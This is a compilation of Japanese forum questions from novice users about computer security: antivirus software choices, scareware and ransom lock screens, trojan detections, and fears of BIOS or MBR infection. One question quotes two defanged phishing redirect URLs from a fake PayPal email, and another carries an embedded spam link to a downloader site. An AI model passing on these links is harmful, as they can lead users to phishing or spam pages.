現在、無線lanで接続しているノートパソコンを使っていますが、ファイルはほとんど外付けHDDに保存してあります。 この外付けHDDのセキュリティ対策について。 パソコンがウィルス感染していない前提でお聞きしたいです。 ノートPCについてる無線lanスイッチをoffにしておけば、外部から侵入されて外付けHDDの中身を 見られたり奪われた流出する可能性はないですか？ 外付けHDDの中のファイル（文書、画像、動画等）を見た後、パソコンからHDDを取り外しても ファイルや何かデータが残りますか？ 残る場合、消去の方法を教えて頂きたいです。 残っても、そのデータだけではファイルにアクセスできないのであれば問題ないです。
ノートンでは「IDセーフ」が安全だと謳われてますが、 何故安全なのかよくわかりません、 個人情報を暗号化して送信するのは多くのオンラインショッピングサイトでもおこなわれてます。 他より安全だという明確な理由が今一よくわかってないので、初心者にもわかりやすく教えてください。
先月から週に１回のペースで「Disk Antivirus Professional」というウイルスに感染しています。自分の場合はセーフモードにしてそのファイルの場所を開いて削除してその後に念のためにスキャンしています。このやり方が悪いのかどうなんでしょうか？
パソコンの電源を入れたと同時に、請求画面が全てを覆っており、何の操作もできません。全てのツールバーもでてきませんし、タスクマネージャーもでてきません。全てを覆っており、何の操作もできません。画面を動かすことも、小さくすることもできません。どなたか、よい解決策ご存知の方は、アドバイスよろしくお願いします。
エロサイトなどには無縁なのでセキュリティ情報に疎く、ＰＤＦファイルが危険だなんて知りませんでした。 某セキュリティソフトは入れています。 メインブラウザはIE以外です １　ＰＤＦファイルの閲覧はAdobeとそれ以外の、どちらを使った方がいいのでしょうか？ ブラウザ同様ＩＥより他、Adobeより他、でしょうか？ ２　ネット閲覧中にPDFファイルを見る必要が出た時、 PDFファイルをDLして、LANケーブルを外して閲覧すれば、しないより安全ですか？ その後ＬＡＮケーブルを繋ぎ直してしまえば同じことですか？ 処理待ちのタスクとして残っているものなのでしょうか？ ３　スタンドアロンのPCで閲覧する場合にどんなリスクがあるでしょうか？ 文系にも判るように、噛み砕いてか喩えでお教え頂けると助かります
ウイルススキャンしてみたら、program files内にトロイに寄生されているプログラムを検知しました とりあえず、コントロールバネルでHDDのシステムの保護を解除したのですが、このままアンインストでいいのでしょうか？それとも隔離でとどめておいた方がいいのでしょうか？
お世話になります。 質問させていただきます。 SSDにWindows7 Home Premium 64bitをインストールし、セキュリティソフトとしてnorton internet securityを使用しております。 このたびウィルスチェックを行った際、一日前の「スキャンした項目の合計」より、数が減少しておりました。（354,799→281,808） 特段ファイルを削除したり、nortonの設定をいじったりしたことはありません。（完全スキャンにしてあります） 今までwindows XPを使用してきましたが、このようなことがなかったので困っております。 Windowsカテゴリかこちらのどちらで質問したらいいか悩みましたが、こちらにて質問させていただきます。 ご存知の方がおられましたら、ご教示お願いいたします。
PCすらも初めてで知らない人に教えることや ネットを利用する上で まず した方が良いと思われることは 何でしょうか？ コレ っていう 絶対の対策なんて無い ということを前提に どれが良いか？悪いか？ではなく 人それぞれに行っている対策（予防？）法などあれば 回答おねがいします。
ウイルス対策としてアバストを入れており、そちらではまったく異常はないのに、、「ウイルスに感染した」」「お使いのPCのパフォーマンスが低下している」、とかいうメッセージがでて、「今すぐクリックして駆除」みたいなボタンがあります。×印で一度閉じましたが、何度もでてきます。なんかクリックすると怪しいとおもうのですが、どうやったらでなくなるでしょうか？
常時安全セキュリティ24のWindows版を利用していますがスマホ購入したのでセキュリティを入れようと思っています。 Android版にはウイルス/スパイウエア対策、ファイルアンチウイルス他3つしか無いですがセキュリティは大丈夫でしょうか？ メールは大丈夫でしょうか？ 他にもっと良いものがあれば教えてください。 宜しくお願いします。 イーモバイルSTREAM X（GL07S）です。 http://www.nifty.com/sec24/service/detail.htm
フリーのavastをダウンロードしてインストールして、送られてきたメールの URLをクリックして、登録を済ませたのに、起動しません。 Failed to language dll 1033\UILangRes.dll のダイアログ表示されるだけで起動しません。 普通は、タクスバーに自動的にアイコンが表示されるのに、表示されません。 解決方法を教えて下さい。 よろしくお願い致します。 WindouwXP sp3 <a href=http://soundfrost.org/ >youtube free downloader</a>
現在、無線ルータ（WZR-600DHP）を使っており、そのルータの有線ポートからデスクトップPCを接続しており、WI-FIでスマホ利用してます。 新たにタブレットPCをWI-FIで接続したいのですが、有線ポートで使用しているPCがウィルスに感染した場合、タブレットPCも感染する可能性はあるのでしょうか？またその逆でタブレットPCからデスクトップPCにも感染する事もあるのでしょうか？ タブレットPCが会社のPCの為、情報漏洩が心配です。 よろしくお願いします。
現在キングソフトを使用しているのですが、 某別の質問サイトで質問した際、 あまり評価がよくなく、中国製のものに身を委ねるのは良くないと言われ、 新しいものに変えようと思ったのですが、あまり良い回答が得られなかったので こちらさまで質問させてもらいます。 フリーのウイルスソフトで総合的に良いものを導入しようと思っているのですが 初心者の私でも扱うことのできるものでよいものは何でしょうか。 フリーのものは自己責任であまりよくないのは重々承知ですが、 有償のものだと毎年新たにライセンスを購入しないといけないので。 avast!やAVG、Avira AntiVirなどいろいろな対策ソフトがあり、 常駐型？とかよくわかりません。 どれが良いかわかりません。 海外のサイトに行くことが多いので できるだけウイルスの検知率の高いものが好ましいです。 OSはwinXPです。 そのへんを踏まえて初心者の私にわかるよう教えてくださると嬉しいです。 回答の方よろしくお願いします。
facebookを利用する時にESET Social Media Scanner等のセキュリティアプリを使ったほうがいいでしょうか？
私は最近windows8対応のFUJITSU LIFEBOOK AHシリーズを購入しました。 現在はノートンの９０日お試し無料を使っているのですが、そろそろ９０日たってしまうので、優秀なセキュリティソフトを探してネットで調べたのですが、素人なのでよくわかりません。 無料ではａｂａｓｔとｃｏｍｏｄｏの併用 有料ではカスペルスキーがいいと自分なりに調べた結果たどり着きました。 どちらがいいでしょうか？ 当然有料のほうがいいのでしょうが、なるべく無料でたりるなら無料にしたいです。このパソコンは４年ほど使っていこうと思っています。 また、ほかにおすすめはありますでしょうか？ ａｂａｓｔとpctools firewall plusの併用を兄がしていたのですが、残念ながらpctoolsのほうは無料版が配信停止になってしまったみたいです。
norton safe web liteはどのようにすれば利用できますか？ 有料ソフトの機能の一部としてだけ利用できるものでしょうか？ 宜しくお願いします。
本日Microsoft　Security　EssentialsでTrojan:JS/Seedabutor.B、警告レベル重要 またSecurity　Essentialsで次のエラーが発生しました：エラーコード　0x80508023。 このコンピューターでは、マルウエアやその他の望ましくないソフトウエアは見つかりませんでした。 と表示されました>< カテゴリはトロイの木馬でした。 実行した操作に「検疫済み」と書かれていたのですが、これはもう放置しておいても大丈夫ということなのでしょうか…? ご回答よろしくお願いいたします<m(__)m>
レノボのパソコンを使っています。最近変な現象が起きます。最初の画面でロック解除のパスワードを入れるところに勝手に”・・・・・・”と打ち込まれ消しても消しても打ち続けられます。またエクセルをやっていると急に”＋＋＋＋＋＋”が打ち込まれ収集がつかなくなり、強制終了するほかありません。ウイルスソフトは”ESTE”を使っており、カスタマーサービスに連絡しとところカスタム検査をするように言われ、行なったのですがウイルスは見つかりませんでした。しかしその後も度々発生します。解決策を教えてください。よろしくお願いします。
現在、ノートンインターネットセキュリィティーを使用しています。 来年の4月で、WindowsXPのバグ更新が終了します。 ノートンも、WindowsXPでの更新をストップするのでしょうか？ WindowsXPのバグ更新終了は致し方ないとして、セキュリィティーも更新出来ない（使用不可）事になると、真剣にOSの変更（新規購入）を考えていかないと思うのですが、どうなんでしょうか？ （過去のサポート終了OSの時はどうだったのか？） 予測でかまいませんので、意見をよろしくお願いします。
本来あるはずの機能がないのですが、これは偽アドオンをインストールしてしまったってことでしょうか。とりあえずほかのブラウザを使ってアドオンインストール後にログインしたところのパスワードは変更しましたが、リカバリーもやってそれからまたパス変更したほうがいいでしょうか？
マカフィーのトータルプロテクションをインストールしたばかりです。 セキュリティ履歴にあるブロックされた不審な受信ネットワーク接続が 20件位あったので何件かのIPアドレスを調べてみたらアメリカ本土 とシンガポールからでした。 ネットに接続して1時間足らずでこんなに接続を試みてくるものなのかな と不思議に思い別の不審なIPを検索してみたら、AmazonやTwiiter の文字が含まれてました。 もしやマカフィーの御検知ということは考えられますか?
みなさん、よろしくおねがいします。 会社で個人所有しているプリンターが壊れたので、友達のプリンターを貸してもらいました。 友達はプリンターをLANケーブルで接続し、自分はUSBケーブルで接続して使用することにしました。 そしたら、上司がウィルス感染したらどうするんだと怒られてしまいました。 プリンターを介して感染することあるんですか？ よろしくお願いします。
僕の知り合いにPCの詳しい人がいて、最近不審なメールが、送られてくるのですが、知り合いから送られてきたのではと心配になります。ただ、知り合いは僕のメールアドレスを知らないので、ウイルスを僕のPCに送る可能性は低いと思うのですが、ウイルスソフトでチェックする限り感染も無く、現在は放置しています。 特定の相手にウイルスを送る場合は、メール等に添付する形での方法しかありませんよね？ サイト等にウイルスを埋め込むタイプのウイルスは（ガンブラー等）不特定多数の人にウイルスを感染させる方法ですよね？　 お返事待ってます。
無料版で高機能なウイルス対策ソフトを探しているのですが数が多すぎて分かりません。 以前はkingsoftを使っていたのですが性能が良いのか良く分からずアンインストールしてしまいました。 新たなウイルス対策ソフトでほしい機能としては、ウイルスの検査、ウイルスの駆除、不要ファイルなどのクリーンアップ、レジストリ修復、スタートアップ最適化などです。ちょっと欲張りかもしれませんがおすすめのウイルス対策ソフトについて詳しい方よろしくお願いします。
勝手に定義ファイルを更新しないウイルス対策ソフトはありませんか？ 私が知っているウイルスバスターでは、古いバージョンは自動更新を OFFする事が出来ましたが、現在のバージョンではこの機能は無くなり 勝手に更新してしまいます。 現在、通信専用モバイルSIMを使用していて、通信制限がある為に 余計な通信をさせたく無いのです。 ウイルス対策ソフトとしての性能は2の次でいいと思っています。 どなたか教えて下さい。
先日、Ａｄｏｂｅ　Ｒｅａｄｅｒ　のアップデートを推薦されてインストールしたところ、 マカフィーのセキリュティー まで一緒にインストールされてしまいました。 無料のようですが、当方、ＮＴＴのセキリュティーをインストール済みのため２つもいらないのではないかと マカフィーの方をアンインストールしようと思っているのですが、残すべきなのか、どなたか分かる方 教えてください。お願いします。
家でwindows7とスマホを使っているんですが、両方のウイルス対策を２年以上したいのですが、どのソフトを購入するのがよいでしょうか。価格が一番安くて対策期間が長いものでお願いします。（ESET限定）オフィスとか色々ありすぎてよくわからないので・・・
以前よりノートン・インターネット・セキュリティを使用しており、 このたび使用期限到来に合わせ、以前購入してまったく使用していなかった 2012年版に更新しました。（延長手続きのような感じで、シリアルNo.を入れて更新しました） 期限は731日後ということになったのですが、インタフェースはまったく同じです。 前回更新時（2年前）は最新バージョンにアップグレードできたような記憶があるのですが、 今回2013年版への自動UGってできないのでしょうか。 ちなみに、今回の更新に使用したのは、一昨年購入した2012版です。 よろしくお願いします。
２月２８日に、ＮＴＴ西日本セキュリティー対策ツールの新バージョン（Ｖｅｒ．２１）が公開されたらしく、昨日、Ｖｅｒ．２０からＶｅｒ．２１へグレードアップしました。 と、ここまではよかったのですが、コンピューターをシャットダウンしようとしたらセキュリティー対策ツールがアップデートを始めたので、シャットダウンできないな、と知っていてわかっていたのですが、「じゃあ、もし、強制的にシャットダウンしたらどういうことが起きるのだろうか」とふと思いまして、強制的にシャットダウンしてしまいました。 次の日（今日）。 いつものように起動をしました。 しかし、下のような画面（コンピューターにboost_date_time-vc80-mt-1_49.dllがないため、プログラムを開始できません。この問題を解決するには、プログラムを再インストールしてみてください。）が出てきました。ＯＫを押してみました。しかし、何回も出てきました。しかも、この画面がいつも最前面に出てきてとても不便でした。 「あ。。。これは、昨日強制的にシャットダウンしたからだ、セキュリティーだ。」と思い、セキュリティーのメイン画面を開いてみるも、このエラー画面しか出てきませんでした。 次に、http://f-security.jp/v6/support/download/index.h …に行って、今度は手動でインストール（もう一回上書き）しようと思い、しましたが、「既にインストールされているから」とかいうメッセージが出てきてダメでした。 だから次にかんがえたのは、[プログラムのアンインストール]でアンインストールしてからさっきのページでインストール、と思ったのですが、さっきのエラー画面がどうやっても（タスクマネージャーもだめだった）消えないせいか、アンインストールができませんでした。 だから、次に、http://f-security.jp/v6/support/faq/200293.htmlに言って手順通りにやって再起動してみたものの、また同じエラー画面が出てきて落胆しました。 だから、またアンインストールしてみようと思ってアンインストールしたら今度はちゃんとアンインストールできました。 そして、インストール・・・はしてもまたあのエラー画面が出てきて困るんだろうな、、、と思うともう何もできなくなりました。 ― 思ったのですが、その「boost_date_time-vc80-mt-1_49.dll」とかいうのは何なのでしょうか？ 私がアップデートを強制終了してしまったのとこの「boost_date_time-vc80-mt-1_49.dll」はどういう関係があるのでしょうか？ そして、「boost_date_time-vc80-mt-1_49.dll」を取り戻してまたインストールすれば正常に戻るものなんでしょうか、そして、戻せるならどうやって戻せばよいのでしょうか？ もちろん「boost_date_time-vc80-mt-1_49.dll」で検索してもよく分からないし、、、（http://cgi.search.biglobe.ne.jp/cgi-bin/search_b …） 取り戻せるかと思って似たようなのをインストールしてもダメだったし（http://www.boostbyreason.com/resource-file-5119- …）、、、 もとは私が悪かったです。 どうすればいいのでしょうか？
現在夫婦でスマホ、子供はiPhone5購入を検討中です。 そこでスマホのセキュリティーについてですが、 PCでマカフィーを使っていてスマホも一緒にセキュリティーしてくれるとの事で購入しようと思ったのですが、 １ユーザー5ユーザーの意味が今ひとつ分かりません。 （どちらを購入したら良いかわかりません） 現在パソコンは一台（auひかり予定）のちにメアドは増えます。 パソコンを増やすかは検討中！ 他に良いセキュリティーソフトはありますか？ マカフィーはパソコン購入時付いてきたものを更新して使ってます。
MBR部分がウイルスに感染したと思われる場合、CDドライブにLinuxベースのデータ消去ソフトCDを入れ、BIOSでCDドライブからブートさせた後、その消去ソフトからMBR部分も含めてHDDデータ全てをゼロフィルしています。 1 CDドライブからデータ消去ソフトをブートさせた後データ消去を実行する前にその前提として、 データ消去ソフトがブートされた時に、HDDの存在をデータ消去ソフトが認識する必要があります。 データ消去ソフトがHDDの存在を認識したときに、HDDのMBRが読み込まれMBRにあるウイルスが活動してゼロフィル作業をブロックするということはありえますでしょうか？ 2 パソコンの電源を入れたときに、BIOSがHDDを含めて各デバイスを認識すると思います。 この認識作業のときに、HDDのMBRが読み込まれ、そのMBR部分のウイルスが実行されるということはあるでしょうか？ データ消去ソフトのCDがCDドライブからブートされる前に、すでにMBRのウイルスが実行されている状態です。
PayPalを装った支払いに関するメールが届き、PayPalに問い合わせる為に 取引IDを確認しなくてはいけなくて、メール内にある「Transaction ID」 のID部分をコピーしようとして間違ってクリックしてしまい、マイクロソフトのようなページに飛んでしまいました。 直ぐにページは閉じたのですが、ウイルス感染やPC上のパスワード等の機密情報を盗まれていないか心配です。 「aguse.jp」で調べたところ、リダイレクトしてマイクロソフトのサイト？（フィッシングサイト？）を表示しているようですが ブラックリストには記載されていないようで、リンク先に飛んでしまったことで、どういった問題があるかわからず不安です。 アドバイス頂けないでしょうか。 Transaction ID: xxxxxxxxxxxxx ID(xxxxxxxxxxx)部分のリンク先 ttp://www.ks-sport.de/ks1/templates/beez/wps.php?pprec aguse →　ttp://www.aguse.jp/?url=http%3A%2F%2Fwww.ks-sport.de%2Fks1%2Ftemplates%2Fbeez%2Fwps.php%3Fpprec ttp://artexte.ca/wp-content/themes/toolbox/i.php?pprec aguse →　ttp://www.aguse.jp/?url=http%3A%2F%2Fartexte.ca%2Fwp-content%2Fthemes%2Ftoolbox%2Fi.php%3Fpprec
パソコンのソフト、ウイルスから守る物だけど、インストールしたら、そのままほったらかしにしてても大丈夫ですか？たまに、クイックスキャンかコンピュター全体スキャンをかけますか？
BIOSを書き換えるウイルスに感染した場合に、BIOSデータを書き換えられないようにするにはどのような具体的な方法があるでしょうか？ BIOS感染ウイルスに感染しないことが最も重要ですが、残念ながら感染してしまった時にBIOSデータだけは書き換えられないようにする方法です。 OSレベル・マザーボードレベル・BIOS-ROMレベルでの対応方法があると思います。 アドバイスお願いします。
セキュリティーソフト、ノートンを 入れたらアウトルックのメールの送受信ができなくなりました。 どうしたらいいのでしょうか？
3年版というような販売をしているセキュリティソフトがありますが、 1年版を買ったほうが無難でしょうか？ av comparativesやav test organization等の評価を時々みていますが、 3年間セキュリティソフトの評価が変わらないというのは難しいですかね？ 宜しくお願いします。
２月２６日に、CMで外国人歌手出演する家電量販店の本社HPを閲覧していたところ、突然、画面下に「スパイウェアが検出されました。」・「コンピューターが危険な状態です。」と表示され、画面右側には、「無料ウィルスチェック云々」の表示され、慌てた私はそこをクリック。 無料チェックが終わると、状態表示。 そこには１個メモリ領域（？）に検出と。→修復をクリック→レジストリクリナー（？）が起動→ 検出結果が表示　２５５個のエラー→修復を促されたのでクリック→有料ソフトのHPに接続 →有料だったのでHP閉じて、今回の２個プログラムをアンインストール それでもインタネット接続の際には同じ表示が・・・ マイクロソフト・キングソフトのウィスルスキャンでは検出されず、そうこうしているうちに、PCの動きがだんだん遅くなり、今では１つの動作に３分以上かかる始末。再起動しても同じ。 ２日前に復元ポイント指定されてたのでセ－フモードから復元→メーカー無料版・フリーソフトの対策ソフトを入手しよとしても、途中で切断、もしくは、フリーズ状態に。 今も相変わらず、ネット接続時には、チカチカと表示。Adbeのバージョンアップの促すのも追加されてます。 こんな時、どうすれば改善されるのでしょうか？ OSを含めた再インストールで改善されるのでしょうか？ お知恵お貸しください。
PCを新しくしたのでフリーのセキュリティーソフトを入れようと思いました。 前までは、キングソフトを使っていましたが、AVGがよいなどとの話をきき、 日本語対応のフリーソフトで固めたかったので調べてみました。 ですが、性能などについて調べてみても、古い記事ばかりでよくわかりません。 候補にあげているのが、AVG・キングソフト・アバストの３つです。 検出力・軽さ・機能性などをみてどれが１番いいかを教えてください。 関係ないかもしれませんがスペックなどは ノートPC OS：windows8 プロセッサ：HD Graphics 1.40GHz 実装メモリRAM）：4.00GB システムの種類：64ビット です。表記の仕方が間違っていたらすみません。
OSを新調したので、手持ちの古い Office がインスト可能かどうかネットで調べていましたところ、 　もう既にMSのサポートが切れている 　セキュリティホールの対策の更新はおこなわれないので非常に危険 　ソフトウェアのセキュリティホールからの感染はウイルス対策ソフトで防げないので危険 　ソフトウェアのセキュリティホールから感染した場合は、ウイルス対策ソフトで検知できない といった旨の文言をみつけました。 当方、今まではウイルス対策ソフトに頼り切っていたので ちょっと驚いてしまいました。 ウイルス対策ソフトは、ひとつだけではなく たまにですが、別メーカーのものでウイルルスキャンしたりもしていたし 自分のは大丈夫と安心しきっていたのです。 ちなみにPCを使って10数年の間、上記のようなウイルス対策ソフトによるスキャンで一度も ウイルスが検知されたことはありませんでした。 拾い物とかにウイルスが入っていたことはありましたが 事前にウイルス対策ソフトが検知して知らせてくれましたし 世間の人は何故にウイルスにかかるのか疑問に思ったりもしてたくらいです。 その古いバージョンのOfficeを使うかどうかは置いておいて・・ 上記の文言は、ほぼ間違いない事実なのでしょうか？ さらに言うと、（当方、Win7 使用中ですが）OSのセキュリティホールも MSから次々と更新されますが、OSのセキュリティホールも上記文言にならい 　OSのセキュリティホールからの感染はウイルス対策ソフトで防げない 　OSのセキュリティホールからの感染した場合は、ウイルス対策ソフトで検知できない のでしょうか。 もしそうだとしたら、Officeに限らず 色々なソフトをOSにインストールするのが通常なのだから その様々なソフトの弱点（セキュリティホール等）をついて既にウイルスに侵されてるPC が多数あると思われます。 （MSの製品のようにセキュリティホール等の対策で、更新が頻繁に行われているソフトウェア等 ほとんどないため） ということは、ウイルス対策ソフトってあまり意味がないように思われてきます。 （ある一定のところまで防ぐ事ができるので意味がないとは言い過ぎですが・・） 長文になってしまいましたが、まとめますと・・ 　上記文言は事実でしょうか？ 　OSのセキュリティホールについても上記文言と同様でしょうか？ 　ウイルス対策ソフトについてのご意見・アドバイス等 です。 回答どうぞ宜しくお願い致します。
フリーセキュリティーソフトの質問でavastのフリー版使ってれば問題ないそうなんです。 今の時代、セキュ板で迂闊にそんなこと言えるでしょうか。 どう思われますでしょうか？ 何か根拠があるなら堂々とお話して頂けたらと思ってるところなんですが。
来月からオーストラリアへ行き最初の１ヶ月はホームステイをします。 あちらのネット環境は日本ほどよくないみたいで、多くの一般家庭は１日のネット時間を制限していたりダウンロードや動画の閲覧は禁止している家庭も多いみたいです。 エージェントからも、ダウンロードや動画の閲覧には本当に気を付けてほしいと言われています。 ダウンロードや動画の閲覧は気を付けることができますが、今私はノートンを入れています。 もともとの設定で『自動ライブアップデート』、『パルスアップデート』、『新しいバージョンの自動ダウンロード』が全てONになっています。 聞いた話では、ダウンロードを禁止しているのならたぶんインストールやアップデート、アップグレードなどもしないほうがよいという事をききました。 なので、先ほど書いた３つの設定をOFFにしようかと思うのですが、危険ですか？ ホームステイの間１ヶ月間もアップデートしない、新しいバージョンのダウンロードをしないと何か不都合が起きたりしますか？ もしOFFにしたら、手動ではアップデートできますか？ そもそも『パルスアップデート』とは何の事でしょうか？ もうあまり日にちがないので、どうしたらよいかとても悩んでいます。　宜しくお願いします。
ウイルスによってBIOSデータを書き換えられた場合、そのBIOSデータを正常なデータに修復する方法について教えてください。 1 A PC電源を入れたときに、BIOSユーティリティを起動し[Load BIOS Defaults]を選択 B 同じバージョンのBIOSで上書き C 最新のバージョンのBIOSで上書き このA・B・Cのそれぞれのパターンについて、 α BIOSデータはすべて上書きされ、ウイルスによって書き換えられたBIOSデータは一切残らない β BIOSデータは全て上書きされるわけではなく、ウイルスによって書き換えられたBIOSデータの一部は上書きされず残る γ BIOSデータは全て上書きされるわけではなく、ウイルスによって書き換えられたBIOSデータすべてが上書きされず残る のケースが考えられると思います。 [BIOSデータはすべて上書きされ、ウイルスによって書き換えられたBIOSデータは一切残らない]状態にするには、A,B,Cのどの方法がよいでしょうか？ 2 windows起動後のユーザーアカウントのログイン後の状態からBIOSの上書きをする場合、BIOSに感染したウイルスによってその上書き作業がブロックされるということは考えられるでしょうか？ 念のため、 ○セーフモード画面から実行 または ○上書き用のBIOSデータをCD-ROMディスクに保存し、パソコン電源入力後、CD-ROMドライブからブートして上書き用のBIOSデータを実行 をした方が良いでしょうか？ 3 BIOSデータが書き換えられた場合、SMBIOSに関しても何らかの修復作業は必要になるのでしょうか？
アダルト番組の視聴料と称する画面が出て困っています。 どこから紛れ込んだのかわからないのです。 システムのバックアップや　CNTL+DEL　のシステム削除は受付られません。 ファイルの追加と削除画面にはフアイルそのものがありません。 以前にニュースで見た新手の振込詐欺と思います。 削除方法ご存知の方、削除方法教えて下さい。
ウイルスバスター　クラウドのセキュリティレポートのログ（詳細）を間違って消してしまったのですが、これってもう元に戻すことって無理でしょうか？
http://www.amazon.co.jp/%E3%83%9E%E3%82%AB%E3%83 … はwindows7でも使えますでしょうか?
ウイルスバスター　クラウドをアンインストールしてから再びインストールし直したら、設定やパスワードなどはすべて引き継がれるのでしょうか？
今ESET SMART SECURITY6を使用しています。 Windows8で前バージョンの5から使っていて バージョン6にアップデートして使っています。 しかし先日からウイルス定義データベースの アップデートがどうしても失敗してしまい、 アップデートできなくなりました。 具体的には2月20日のＶｅｒ8029のデータベース 以降のものが失敗してできません。 何か解決方法はないでしょうか。
BIOSのウイルス感染について4点教えてください。 1 BIOSの設定画面では 各デバイスの有効・無効 SATAをATAまたはAHCIのどちらを選ぶか 等の項目の設定ができますが BIOSがウイルスに感染した場合にBIOSの書き換えられる場所というのは、 上記のようなBIOS設定画面で設定できる項目に限られるのでしょうか？ それとも BIOS設定画面で表示される項目以外も書き換えられるのでしょうか？ 仮にBIOS設定画面で表示される項目に限られるのであれば、BIOS設定画面の各項目が変更されていないか目視で確認できると思います。 ただ、BIOS設定画面で表示される項目以外も書き換えられるのであれば、その書き換えはどのようにして確認すればよいのでしょうか？ 2 BIOSがウイルスに感染するケースは滅多になく、基本的に無視してよいものなのでしょうか？ 3 BIOSがウイルスに感染した場合、どのような被害が考えられるでしょうか？ 個人的には、ファイルに実行ファイルが付加されたり、ファイルを外部にアップロードされたり、リモートから操作されるといったことを恐れています。 4 BIOSが書き換えられた場合に、元のBIOS設定に戻すにはどうすればよいでしょうか？
ウイルスバスター クラウドのメイン画面でセキュリティレポート 検出された脅威〇件と出ますが、一ヶ月経つのを待つ以外にここの表示を変える（０件にする）ことってできますか？
昨年末に購入した、ノートＰＣ　ＦＭＶ　ＭＨ２０（http://kakaku.com/item/J0000004974/spec/#tab）ですが、そろそろ、セキュリティーソフトの更新時期が近づいてます。で、ノートン→ウイルスセキュリティーゼロ（ソースネクスト）に、変更しようと検討中です。このＰＣには、オプティカルドライブトレイが、ありません。ウイルスセキュリティーゼロですが、以前は、ＵＳＢバージョンがありましたが、現在は、ＣＤロム/ダウンロードバージョンしかありません。ＣＤロムバージョンには、シリアルナンバーが付属されていて、オプティカルドライブトレイがなくても、ＨＰの入力画面から、それを入力すれば、インストール可能でしょうか？お詳しい方、お手数ですが、アドバイス下さい。
ブラウザとフラッシュとセキュリティソフトは最新版でアップデートも最新です。 OSだけがアップデートしてない状態です。用途はブラウザでネットするだけです。 このときどういう危険がありますか？ アップデートが100個以上でとても面倒くさいというか時間がかかりそうなので無視しようか迷ってます。
IBMの主力だったThinkpadですが、残念ながら中国のレノボという会社に、売り渡されてしまいました。先程、webを見ていますと、中国製のパソコンにウィルスがプリインストールされていたそうです。もうThinkpadの購入は、止めたほうが良いのでしょうか？
今朝、メールを確かめるとNACHAという所からスパムと思われるメールが届きました。 内容は、よくわからない英語とリンクがひとつありました。 もしかすると、ウイルスメールかもしれません。セキュリティソフトはGDataをつかっています。このメールのリンクは開いていいのでしょうか。 ご存じの方は教えてください。お願いします。
AVG アンチウイルス 2013を入れて定義の自動更新を停止しました。 （理由は手動でしたいから） そうすると自動更新が有効になっていないせいでタスクトレイの AVGアイコンに△の中に！マークが付くようになってしまいました。 これを消す設定や方法はありませんでしょうか？ avastならそういう設定があるのですが…。
PC：NEC LaVie L　LL550/KG OS：Windows Vista Home Premium CPU名称Mobile AMD Sempron 3400+ メモリ[標準容量] 1G 昨日インターネット中にウイルスバスターがブロックしたサイトにも関わらず アクセスし、ウイルスに感染したようです。 一応、ウイルスは駆除されたとなっていますが、 ウイルス名：TROJ_PDFEXP.SMMC その後、再起動してくださいと警告が出て再起動しました。 再起動後は普通に使っていましたが、 しばらくすると「コンピュータのメモリが不足しています。…」 と警告が出て、アプリケーションエラーとなり、操作もできなくなり、 表示もおかしくなりました。 ネットの画面が真っ白になったり、デスクトップが真っ黒になったり、 アイコンが滲んでいたり、スタート画面の文字が消えていたり… 再起動をかけると使えるようになるのですが、しばらくすると同じような状態になります。 ウイルススキャンをかけても何も反応しません。 今まで普通に使っていてメモリ不足とは考えられないし、 昨日のウイルスの仕業としか思えないのですが・・・ どうしたらよいのかわからず困っています。。。 リカバリとやらをするしかないのでしょうか・・・・
こちらのサイトではウイルス対策としてブロードバンドルータを推奨しています。 https://www.ccc.go.jp/knowledge/index.html ウイルス対策の手法には、100%完璧というのはもちろんないと思いますが、それでも「ほとんど役に立たない」から「とても効果的」まで、いろいろあると思います。 ブロードバンドルータがウイルス対策に有効なのであれば使いたいと思うのですが、ブロードバンドルータってウイルス対策にどのくらい有効ですか。
アカウントのパスワード入力後、パソコンの画面が白くなりほとんど操作できなくなります。 上記のような問題が使用しているノートＰＣで起こり、大変困っています。 IEでネットサーフィンをしていたところ、突然、白い画面に英語の文章、そして私の現住所とPCのwebカメラで撮影された自分の画像が出てきました。 一瞬でウイルスだと気づき、強制終了させたのですが、文章の中にはお金を請求するような（確信はないのですが・・・）文章が書いてあったかもしれません。 強制終了後、何回起動しても、アカウントのパスワード入力までは出来るのですが、その後画面が白くなってしまい何も操作できません（画像(1)）。白い画面の状態で、ctrl+alt+deleteを入力すると、タスクマネジャーの起動やログオフ出来る画面までは飛べるのですが、そこでタスクマネジャーを起動させようとしても元の白い画面に戻るだけです。マウスは表示され、白い画面上で動かせますが、どこをクリックしても反応なし、スタートボタンを押しても反応なしです。 セーフモードで起動すると、アカウントのパスワードを入力後、セーフモードのデスクトップが表示されますが、なぜかいきなりシャットダウンされます。コンピュータの修復（システム回復オプション）の、システムの復元を使っても、エラーが出て復元されません（いろいろな復元ポイントは試しました。） 上記のように、再起動、セーフモード、システムの復元などを繰り返ししましたが問題は解決されません。 ctrl+alt+deleteを押した後の画面から、パソコンをシャットダウンするとシャットダウンの途中で、白い画面が消え、一瞬ですが自分の通常のデスクトップ、アイコンが表示されます。その後通常にシャットダウンされます。 パソコンはバイオのVGN-NW51FB（http://www.sony.jp/vaio/products/NW2/）で、ウイルスソフトは入れていませんでした。現在、私はアメリカ在住です。 シャットダウン時に、通常のデスクトップが見えたり、アカウント入力までは出来るため、液晶の問題ではなくウイルスな気がしますが、自分で出来る対策では限界です。 パソコンがちゃんと動作しないので、課題の提出などで非常に困ってます。よろしくお願いします。
感染したと思われるのですが、起動ボタンを押すと下記のメッセージが表れて 先に進めません。セーフモードで試しましたが同様のメッセージが出ます。 Windousu7を使用しています。 Invalid system disk Replace the disk, and then pres any key どのキーを押しても、ctrl＋Alt＋Delateを押しても同じでした。 インストールソフトは、必死に探していますが、今は見つかってないですが、たぶんあるとは思います。 探します。 ご回答お願いいたします。（PCはあまり得意ではありません・・・）
こんばんは。いつもパソコンは立ち上げるのが面倒くさいので、スリープ状態にしています。 夜寝る前にスリープ状態なのを確認していたのですが、夜中に何やら音楽が聞こえるのでおかしいとおもったら、ＰＣが勝手に立ち上がり、スリープモードにする前に表示していたインターネットエクスプローラに表示されていたyoutubeが勝手に再生され、立ち上げてもいなかったスカイプが勝手に立ち上がり、G-mailがログアウトしており、インターネットエクスプローラーがいつも最大化しておくのに、縮小されていました。 ウイルスによるものか、遠隔操作などによるものかなんなのか不安で気味が悪いです。 ウイルス対策としてウイルスバスタークラウドを入れています。コンピューター全体のスキャンをしましたが、特に異常は見つかりませんでした。 OSはWindows７、インターネットエクスプローラー９、富士通のノートＰＣＦＭＶＢＩＢＬＯです。 お知恵をお貸しください。よろしくお願いします。
